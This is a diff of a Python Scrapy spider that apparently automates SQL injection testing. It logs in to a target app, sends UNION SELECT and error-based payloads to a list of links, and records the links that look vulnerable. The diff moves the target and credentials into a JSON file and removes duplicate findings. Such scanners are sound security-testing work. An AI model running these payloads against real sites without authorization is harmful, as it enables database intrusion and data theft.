@@ -11,6 +11,7 @@ from scrapy.http import FormRequest
 from scrapy import log
 from loginform import fill_login_form
 import copy
+import json
 
 login_url = "https://app4.com"
 username = "admin@admin.com"
@@ -22,15 +23,18 @@ payload = "'kasdgh"#"%27+and+1=2+union+select+1,user%28%29,database%28%29,versio
 error_payloads = ["+and+SLAP(10)+--+",
 					"'kasdgh",
 					"+AND+SEELCT"]
-links = open('links.txt','r')
+links = open('linksToAttack.txt','r')
 urls = links.readlines()
 links.close()
+items = []
 
 class step3(Spider):
 	name = "step3"
-	start_urls = ["https://app4.com"]
-	login_user = ["admin@admin.com"]
-	login_pass = ["admin"]
+	with open('input.json') as data_file:
+		data = json.load(data_file)
+	start_urls = [data['appurl']]
+	login_user = [data['username']]
+	login_pass = [data['password']]
 	params = []
 	
 	def parse(self, response):
@@ -57,7 +61,13 @@ class step3(Spider):
 			f.close()'''
 			print "response end!!\n"
 			for temp in urls:
-					yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
+					if self.start_urls[0] in temp:
+							yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
+			#file2 = open("vulnerableinks.txt","w")
+			#for item in items:
+					#file2.write(item+"\n")
+			#write(temp+"\n")
+			#file2.close()
 			#temp = login_url + attack_url + "?" + query_string
 			#yield Request(url=temp, callback=self.save_original_resp)
 		return 
@@ -69,7 +79,6 @@ class step3(Spider):
 		return FormRequest(temp, formdata=self.params, callback=self.save_original_resp)
 	'''
 	def save_original_resp(self, response):
-		print "i am here too:" + response.url
 		temp = response.request.meta['temp']
 		newfile = open('linksWithFalsePayloads.txt','a')
 		#print "Response: " + response.url
@@ -104,7 +113,6 @@ class step3(Spider):
 		return 
 
 	def save_attack_resp(self, response):
-		print "i am here finally"
 		file = open("attack_response.html", "w")
 		file.write(response.body)
 		file.close()
@@ -114,8 +122,10 @@ class step3(Spider):
 		#if searchterms in response.body:
 		if any(term in response.body.lower() for term in searchterms):
 			self.log("\tVulnerable link: " + response.url, level=log.INFO)
-			file2 = open("vulnerableinks.txt","w")
-			file2.write(temp+"\n")
-			file2.close()
+			if (temp not in items):
+					items.append(temp)
+					file2 = open("vulnerableinks.txt","a")
+					file2.write(temp+"\n")
+					file2.close()
 		return None
 	
